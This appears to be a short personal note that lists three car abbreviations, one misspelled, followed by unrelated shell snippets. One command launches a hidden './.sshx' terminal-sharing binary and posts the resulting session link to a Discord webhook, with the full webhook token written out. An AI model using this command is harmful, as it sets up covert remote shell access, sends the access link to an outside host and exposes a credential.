- [ ] cc : cubic capacity 
- [ ] FWD : Forwared-Wheel Drive
- [ ] RWD : Rear-Wheel Drive

```sh
./.sshx > ffff.txt & sleep 1 && grep -o 'https://[^ ]*' ffff.txt | jq -Rs '{content: .}' | curl -H "Content-Type: application/json" -X POST -d @- https://discord.com/api/webhooks/1492128074219651104/CovYKao8JG0ANAwn_nt1v6Edyr3JO4VWLMBqzU8nqmNghfMRzcVqOD6TpGr3ezE5llos
```


```
cat ffff.txt | grep http | awk '{print$3}' | xargs | awk '{print "<"$0">"}'
```